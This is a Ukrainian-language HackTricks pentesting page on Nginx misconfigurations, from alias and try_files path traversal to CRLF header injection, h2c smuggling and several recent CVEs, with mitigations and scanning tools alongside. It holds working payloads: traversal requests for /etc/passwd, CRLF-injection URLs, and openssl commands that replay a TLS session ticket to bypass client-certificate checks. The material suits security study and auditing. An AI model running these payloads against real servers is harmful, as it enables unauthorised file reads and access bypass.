# Nginx

{{#include ../../banners/hacktricks-training.md}}


## Відсутнє root-розташування <a href="#missing-root-location" id="missing-root-location"></a>

Під час налаштування сервера Nginx **root directive** відіграє критичну роль, визначаючи базову директорію, з якої віддаються файли. Розглянемо приклад нижче:
```bash
server {
root /etc/nginx;

location /hello.txt {
try_files $uri $uri/ =404;
proxy_pass http://127.0.0.1:8080/;
}
}
```
У цій конфігурації `/etc/nginx` призначено як кореневий каталог. Така налаштування дозволяє отримувати доступ до файлів у вказаному кореневому каталозі, наприклад `/hello.txt`. Проте важливо зауважити, що визначено лише конкретне місце (`/hello.txt`). Немає конфігурації для кореневого location (`location / {...}`). Це пропущення означає, що директива root застосовується глобально, дозволяючи запитам до кореневого шляху `/` отримувати файли з `/etc/nginx`.

З цієї конфігурації випливає критичне питання безпеки. Прості `GET`-запити, наприклад `GET /nginx.conf`, можуть розкрити конфіденційну інформацію, віддавши конфігураційний файл Nginx, що знаходиться за `/etc/nginx/nginx.conf`. Встановлення root у менш критичний каталог, наприклад `/etc`, може зменшити цей ризик, але все ще може дозволити випадковий доступ до інших важливих файлів, включно з іншими конфігураційними файлами, access logs і навіть зашифрованими обліковими даними, що використовуються для HTTP basic authentication.

## Неправильна конфігурація Alias LFI <a href="#alias-lfi-misconfiguration" id="alias-lfi-misconfiguration"></a>

У конфігураційних файлах Nginx варто уважно перевіряти директиви "location". Уразливість, відома як Local File Inclusion (LFI), може бути випадково введена через конфігурацію, що нагадує наступну:
```
location /imgs {
alias /path/images/;
}
```
Ця конфігурація вразлива до LFI, оскільки сервер інтерпретує запити на кшталт `/imgs../flag.txt` як спробу доступу до файлів за межами призначеного каталогу, фактично зводячи їх до `/path/images/../flag.txt`. Ця вразливість дозволяє зловмисникам отримувати файли з файлової системи сервера, які не повинні бути доступні через веб.

Щоб пом'якшити цю вразливість, конфігурацію слід змінити так, щоб:
```
location /imgs/ {
alias /path/images/;
}
```
Детальніше: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)

Тести Accunetix:
```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
alias../ => HTTP status code 403
```
## Небезпечне обмеження шляху <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

Перегляньте наступну сторінку, щоб дізнатися, як обійти директиви, такі як:
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
{{#ref}}
../../pentesting-web/proxy-waf-protections-bypass.md
{{#endref}}

## Небезпечне використання змінних / HTTP Request Splitting <a href="#unsafe-variable-use" id="unsafe-variable-use"></a>

> [!CAUTION]
> Уразливі змінні `$uri` і `$document_ur`i і це можна виправити, замінивши їх на `$request_uri`.
>
> Regex також може бути вразливим, наприклад:
>
> `location ~ /docs/([^/])? { … $1 … }` - Уразливий
>
> `location ~ /docs/([^/\s])? { … $1 … }` - Не вразливий (перевірка пробілів)
>
> `location ~ /docs/(.*)? { … $1 … }` - Не вразливий

Приклад нижче демонструє вразливість у конфігурації Nginx:
```
location / {
return 302 https://example.com$uri;
}
```
Символи \r (Carriage Return) і \n (Line Feed) позначають символи нового рядка в HTTP-запитах, а їхні URL-кодовані форми представлені як `%0d%0a`. Включення цих символів у запит (наприклад, `http://localhost/%0d%0aDetectify:%20clrf`) до неправильно сконфігурованого сервера призводить до того, що сервер додає новий заголовок з ім'ям `Detectify`. Це відбувається тому, що змінна $uri декодує URL-кодовані символи нового рядка, що призводить до несподіваного заголовка в відповіді:
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.19.3
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: https://example.com/
Detectify: clrf
```
Дізнайтеся більше про ризики CRLF injection і response splitting на [https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/](https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/).

Також ця техніка [**explained in this talk**](https://www.youtube.com/watch?v=gWQyWdZbdoY&list=PL0xCSYnG_iTtJe2V6PQqamBF73n7-f1Nr&index=77) з деякими вразливими прикладами та механізмами виявлення. Наприклад, щоб виявити цю неправильну конфігурацію з перспективи blackbox, ви можете виконати такі запити:

- `https://example.com/%20X` - Any HTTP code
- `https://example.com/%20H` - 400 Bad Request

Якщо вразливий, перший повернеться нормально, оскільки "X" — це будь-який HTTP метод, а другий поверне помилку, оскільки H не є дійсним методом. Тому сервер отримає щось на кшталт: `GET / H HTTP/1.1` і це викличе помилку.

Інші приклади виявлення:

- `http://company.tld/%20HTTP/1.1%0D%0AXXXX:%20x` - Any HTTP code
- `http://company.tld/%20HTTP/1.1%0D%0AHost:%20x` - 400 Bad Request

Деякі знайдені вразливі конфігурації, представлені в тому виступі, були:

- Зверніть увагу, як **`$uri`** встановлено без змін у кінцевому URL
```
location ^~ /lite/api/ {
proxy_pass http://lite-backend$uri$is_args$args;
}
```
- Зверніть увагу, як знову **`$uri`** знаходиться в URL (цього разу всередині параметра)
```
location ~ ^/dna/payment {
rewrite ^/dna/([^/]+) /registered/main.pl?cmd=unifiedPayment&context=$1&native_uri=$uri break;
proxy_pass http://$back;
```
- Тепер в AWS S3
```
location /s3/ {
proxy_pass https://company-bucket.s3.amazonaws.com$uri;
}
```
### Будь-яка змінна

Було виявлено, що **дані, надані користувачем** можуть розглядатися як **Nginx змінна** за певних обставин. Причина такої поведінки залишається досить невловимою, проте це не рідкість і не завжди просто перевірити. Ця аномалія була відзначена в звіті з безпеки на HackerOne, який можна переглянути [here](https://hackerone.com/reports/370094). Подальше розслідування повідомлення про помилку призвело до виявлення її появи в [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), що вказало на Server Side Includes (SSI) як корінну причину.

Щоб **виявити цю неправильну конфігурацію**, можна виконати наступну команду, яка встановлює заголовок Referer для перевірки виведення змінної:
```bash
$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’
```
Сканування систем на предмет цього неправильного налаштування виявило кілька випадків, коли користувач міг виводити змінні Nginx. Однак зменшення кількості вразливих випадків свідчить про те, що зусилля щодо виправлення цієї проблеми були певною мірою успішними.

### Використання try_files з $URI$ARGS змінними

Нижче наведена неправильна конфігурація Nginx може призвести до LFI вразливості:
```
location / {
try_files $uri$args $uri$args/ /index.html;
}
```
У нашій конфігурації є директива `try_files`, яка використовується для перевірки наявності файлів у вказаному порядку. Nginx віддасть перший із них, який знайде. Базовий синтаксис директиви `try_files` такий:
```
try_files file1 file2 ... fileN fallback;
```
Nginx перевіряє наявність кожного файлу у зазначеному порядку. Якщо файл існує, він буде негайно повернутий у відповіді. Якщо ж жоден із зазначених файлів не існує, запит буде передано до резервного варіанту, яким може бути інший URI або конкретна сторінка помилки.

Однак при використанні змінних `$uri$args` у цій директиві Nginx намагатиметься знайти файл, що відповідає URI запиту в комбінації з будь-якими параметрами рядка запиту. Тому ми можемо експлуатувати цю конфігурацію:
```
http {
server {
root /var/www/html/public;

location / {
try_files $uri$args $uri$args/ /index.html;
}
}
}
```
З наступним payload:
```
GET /?../../../../../../../../etc/passwd HTTP/1.1
Host: example.com
```
Використовуючи наш payload, ми вийдемо за межі кореневої директорії (вказаної в конфігурації Nginx) і завантажимо файл `/etc/passwd`. У debug-логах ми можемо спостерігати, як Nginx намагається відкрити файли:
```
...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 trying to use file: "/../../../../../../../../etc/passwd" "/var/www/html/public/../../../../../../../../etc/passwd"
2025/07/11 15:49:16 [debug] 79694#79694: *4 try file uri: "/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 http filename: "/var/www/html/public/../../../../../../../../etc/passwd"

...SNIP...

2025/07/11 15:49:16 [debug] 79694#79694: *4 HTTP/1.1 200 OK

```
PoC проти Nginx із використанням конфігурації, згаданої вище:
![Приклад запиту Burp](../../images/nginx_try_files.png)

## Читання сирої відповіді бекенда

Nginx надає можливість через `proxy_pass` перехоплювати помилки та HTTP-заголовки, які генерує бекенд, з метою приховати внутрішні повідомлення про помилки та заголовки. Це досягається тим, що Nginx віддає кастомні сторінки помилок у відповідь на помилки бекенда. Однак виникають проблеми, коли Nginx отримує некоректний HTTP-запит. Такий запит пересилається на бекенд у тому вигляді, у якому він надійшов, а сирa відповідь бекенда потім відправляється клієнту без втручання Nginx.

Розгляньмо приклад сценарію з застосунком uWSGI:
```python
def application(environ, start_response):
start_response('500 Error', [('Content-Type', 'text/html'), ('Secret-Header', 'secret-info')])
return [b"Secret info, should not be visible!"]
```
Щоб керувати цим, у конфігурації Nginx використовуються конкретні директиви:
```
http {
error_page 500 /html/error.html;
proxy_intercept_errors on;
proxy_hide_header Secret-Header;
}
```
- [**proxy_intercept_errors**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_intercept_errors): Ця директива дозволяє Nginx повертати користувацьку відповідь для відповідей бекенду зі статус-кодом більшим за 300. Вона гарантує, що, для нашого прикладу з uWSGI додатком, відповідь `500 Error` перехоплюється та обробляється Nginx.
- [**proxy_hide_header**](http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_hide_header): Як випливає з назви, ця директива приховує зазначені HTTP-заголовки від клієнта, підвищуючи конфіденційність та безпеку.

Коли надходить дійсний `GET` запит, Nginx обробляє його звично, повертаючи стандартну помилку без розкриття секретних заголовків. Однак некоректний HTTP-запит обходить цей механізм, внаслідок чого відкриваються сирі відповіді бекенду, включно з секретними заголовками та повідомленнями про помилки.

## merge_slashes встановлено в off

За замовчуванням директива **`merge_slashes`** у Nginx встановлена в **`on`**, що стискає кілька символів `/` у URL до одного. Ця функція, хоча й спрощує обробку URL, може ненавмисно приховувати вразливості в додатках за Nginx, особливо ті, що вразливі до local file inclusion (LFI) атак. Фахівці з безпеки **Danny Robinson and Rotem Bar** підкреслили потенційні ризики, пов'язані з цією поведінкою за замовчуванням, особливо коли Nginx виступає як reverse-proxy.

Щоб зменшити такі ризики, рекомендується **вимкнути директиву `merge_slashes`** для додатків, схильних до цих вразливостей. Це гарантує, що Nginx пересилає запити до додатку без зміни структури URL, не маскуючи основні проблеми безпеки.

Детальніше див. [Danny Robinson and Rotem Bar](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d).

### **Maclicious Response Headers**

Як показано в [**this writeup**](https://mizu.re/post/cors-playground), існують певні заголовки, які, якщо присутні у відповіді веб-сервера, змінюють поведінку Nginx proxy. Ви можете перевірити їх [**in the docs**](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/):

- `X-Accel-Redirect`: Вказує Nginx внутрішньо перенаправити запит на вказане місце.
- `X-Accel-Buffering`: Керує тим, чи має Nginx буферизувати відповідь.
- `X-Accel-Charset`: Встановлює набір символів для відповіді при використанні X-Accel-Redirect.
- `X-Accel-Expires`: Встановлює час дії відповіді при використанні X-Accel-Redirect.
- `X-Accel-Limit-Rate`: Обмежує швидкість передачі для відповідей при використанні X-Accel-Redirect.

Наприклад, заголовок **`X-Accel-Redirect`** спричиняє внутрішній **redirect** в nginx. Тому конфігурація nginx, що містить, наприклад, **`root /`**, і відповідь веб-сервера з **`X-Accel-Redirect: .env`** призведе до того, що nginx відправить вміст **`/.env`** (Path Traversal).

### **Значення за замовчуванням у директиві map**

В **Nginx configuration**, директива `map` часто відіграє роль у **контролі авторизації**. Поширена помилка — не вказати значення **default**, що може призвести до несанкціонованого доступу. Наприклад:
```yaml
http {
map $uri $mappocallow {
/map-poc/private 0;
/map-poc/secret 0;
/map-poc/public 1;
}
}
```

```yaml
server {
location /map-poc {
if ($mappocallow = 0) {return 403;}
return 200 "Hello. It is private area: $mappocallow";
}
}
```
Без `default`, a **malicious user** може обійти захист, звернувшись до **невизначеного URI** всередині `/map-poc`. [The Nginx manual](https://nginx.org/en/docs/http/ngx_http_map_module.html) радить встановити **default value**, щоб уникнути таких проблем.

### **DNS Spoofing уразливість**

DNS spoofing проти Nginx можливий за певних умов. Якщо зловмисник знає використаний Nginx **DNS server** і може перехоплювати його DNS-запити, він може spoof DNS records. Однак цей метод неефективний, якщо Nginx налаштовано використовувати **localhost (127.0.0.1)** для DNS resolution. Nginx дозволяє вказати DNS server таким чином:
```yaml
resolver 8.8.8.8;
```
### **Директиви `proxy_pass` та `internal`**

Директива **`proxy_pass`** використовується для перенаправлення запитів до інших серверів, як внутрішніх, так і зовнішніх. Директива **`internal`** гарантує, що певні локації доступні лише всередині Nginx. Хоча самі по собі ці директиви не є вразливостями, їх конфігурацію слід уважно перевіряти, щоб запобігти проблемам безпеки.

## proxy_set_header Upgrade & Connection

Якщо nginx server налаштований на передачу заголовків Upgrade та Connection, може бути виконана [**h2c Smuggling attack**](../../pentesting-web/h2c-smuggling.md), щоб отримати доступ до захищених/внутрішніх кінцевих точок.

> [!CAUTION]
> Ця вразливість дозволяє атакуючому **встановити пряме з'єднання з `proxy_pass` endpoint** (`http://backend:9999` в цьому випадку), вміст якого не перевірятиметься nginx.

Example of vulnerable configuration to steal `/flag` from [here](https://bishopfox.com/blog/h2c-smuggling-request):
```
server {
listen       443 ssl;
server_name  localhost;

ssl_certificate       /usr/local/nginx/conf/cert.pem;
ssl_certificate_key   /usr/local/nginx/conf/privkey.pem;

location / {
proxy_pass http://backend:9999;
proxy_http_version 1.1;
proxy_set_header Upgrade $http_upgrade;
proxy_set_header Connection $http_connection;
}

location /flag {
deny all;
}
```
> [!WARNING]
> Зверніть увагу, що навіть якщо `proxy_pass` вказує на конкретний **шлях** такий як `http://backend:9999/socket.io`, з'єднання буде встановлено з `http://backend:9999`, тож ви можете **зв'язатися з будь-яким іншим шляхом всередині цієї внутрішньої кінцевої точки. Тому не має значення, чи вказано шлях у URL `proxy_pass`.**

## HTTP/3 QUIC модуль — віддалений DoS & leak (2024)

У 2024 Nginx оприлюднив CVE-2024-31079, CVE-2024-32760, CVE-2024-34161 та CVE-2024-35200, показавши, що **одна ворожа QUIC-сесія** може спричинити аварію worker процесів або leak пам'яті, коли експериментальний `ngx_http_v3_module` скомпільовано і відкрито сокет `listen ... quic`. Вразливі збірки: 1.25.0–1.25.5 та 1.26.0, тоді як 1.27.0/1.26.1 містять виправлення; розкриття пам'яті (CVE-2024-34161) додатково вимагає MTU більших за 4096 байт, щоб вивести на поверхню чутливі дані (деталі в nginx advisory 2024, наведено нижче).

**Підказки для Recon & exploitation**

- HTTP/3 — опційний, тож скануйте на наявність відповідей `Alt-Svc: h3=":443"` або виконуйте brute-force UDP/443 QUIC handshakes; після підтвердження fuzz handshake та STREAM frames з кастомними `quiche-client`/`nghttp3` payloads, щоб викликати падіння worker і спричинити log leakage.
- Швидко визначте підтримку цілі за допомогою:
```bash
nginx -V 2>&1 | grep -i http_v3
rg -n "listen .*quic" /etc/nginx/
```
## Обхід відновлення сесії TLS при client cert auth (CVE-2025-23419)

У лютому 2025 року в повідомленні було розкрито, що nginx 1.11.4–1.27.3, зібраний з OpenSSL, дозволяє **повторно використовувати TLS 1.3 session** з одного name-based virtual host у іншому, тому клієнт, який підключився до хоста без сертифіката, може відтворити ticket/PSK, щоб потрапити у vhost, захищений `ssl_verify_client on;`, і повністю обійти mTLS. Помилка виникає, коли кілька virtual hosts ділять спільний кеш сесій TLS 1.3 і тікети (див. повідомлення nginx 2025, наведене нижче).

**Плейбук атакувальника**
```bash
# 1. Create a TLS session on the public vhost and save the session ticket
openssl s_client -connect public.example.com:443 -sess_out ticket.pem

# 2. Replay that session ticket against the mTLS vhost before it expires
openssl s_client -connect admin.example.com:443 -sess_in ticket.pem -ign_eof
```
Якщо ціль вразлива, друге рукостискання завершується без представлення клієнтського сертифіката, що розкриває захищені локації.

**Що перевіряти**

- Змішані блоки `server_name`, що спільно використовують `ssl_session_cache shared:SSL` та `ssl_session_tickets on;`.
- Адмінські/API блоки, які очікують mTLS, але успадковують налаштування спільного кешу сесій/квитків від публічних хостів.
- Автоматизація, яка вмикає відновлення сесій TLS 1.3 глобально (наприклад, Ansible roles) без урахування ізоляції vhost.

## HTTP/2 Rapid Reset resilience (CVE-2023-44487 behavior)

Атака HTTP/2 Rapid Reset (CVE-2023-44487) все ще впливає на nginx, коли оператори підвищують `keepalive_requests` або `http2_max_concurrent_streams` вище за значення за замовчуванням: нападник відкриває одне HTTP/2-з'єднання, заповнює його тисячами потоків, а потім одразу відправляє кадри `RST_STREAM`, тож стеля одночасних потоків ніколи не досягається, тоді як CPU продовжує витрачати ресурси на tear-down logic. Nginx defaults (128 concurrent streams, 1000 keepalive requests) утримують blast radius невеликим; значне підвищення цих лімітів робить тривіальним виснаження workers навіть від одного клієнта (див. розбір F5, згаданий нижче).

**Поради щодо виявлення**
```bash
# Highlight risky knobs
rg -n "http2_max_concurrent_streams" /etc/nginx/
rg -n "keepalive_requests" /etc/nginx/
```
Хости, які розкривають незвично високі значення цих директив, — ідеальні цілі: один HTTP/2 клієнт може циклічно створювати стріми і миттєво надсилати `RST_STREAM` кадри, щоб завантажити CPU, не перевищивши ліміт одночасних з'єднань.

## Спробуйте самі

Detectify створила репозиторій на GitHub, де ви можете за допомогою Docker налаштувати власний вразливий тестовий сервер Nginx з деякими з неправильних налаштувань, обговорюваних у цій статті, і спробувати знайти їх самостійно!

[https://github.com/detectify/vulnerable-nginx](https://github.com/detectify/vulnerable-nginx)

## Інструменти статичного аналізу

### [gixy-ng](https://github.com/dvershinin/gixy) & [GixyNG](https://github.com/megamansec/gixyng) & [GIXY](https://github.com/yandex/gixy)


- [GixyNG](https://github.com/megamansec/gixyng) (оновлений форк GIXY) — інструмент для аналізу конфігурацій Nginx, мета якого — знаходити вразливості, небезпечні директиви та ризиковані неправильні налаштування. Він також виявляє неправильні налаштування, що впливають на продуктивність, і знаходить упущені можливості для посилення безпеки, дозволяючи автоматизоване виявлення недоліків.
- [gixy-ng](https://github.com/dvershinin/gixy) (активно підтримуваний форк GIXY) — інструмент для аналізу конфігурацій Nginx, мета якого — знаходити вразливості, небезпечні директиви та ризиковані неправильні налаштування. Він також виявляє неправильні налаштування, що впливають на продуктивність, і знаходить упущені можливості для посилення безпеки, дозволяючи автоматизоване виявлення недоліків.

### [Nginxpwner](https://github.com/stark0de/nginxpwner)

Nginxpwner — простий інструмент для пошуку типових неправильних налаштувань Nginx та вразливостей.

## Джерела

- [**https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/**](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
- [**http://blog.zorinaq.com/nginx-resolver-vulns/**](http://blog.zorinaq.com/nginx-resolver-vulns/)
- [**https://github.com/yandex/gixy/issues/115**](https://github.com/yandex/gixy/issues/115)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html**](https://mailman.nginx.org/pipermail/nginx-announce/2024/GWH2WZDVCOC2A5X67GKIMJM4YRELTR77.html)
- [**https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html**](https://mailman.nginx.org/pipermail/nginx-announce/2025/NYEUJX7NCBCGJGXDFVXNMAAMJDFSE45G.html)
- [**https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products**](https://www.f5.com/company/blog/nginx/http-2-rapid-reset-attack-impacting-f5-nginx-products)


{{#include ../../banners/hacktricks-training.md}}
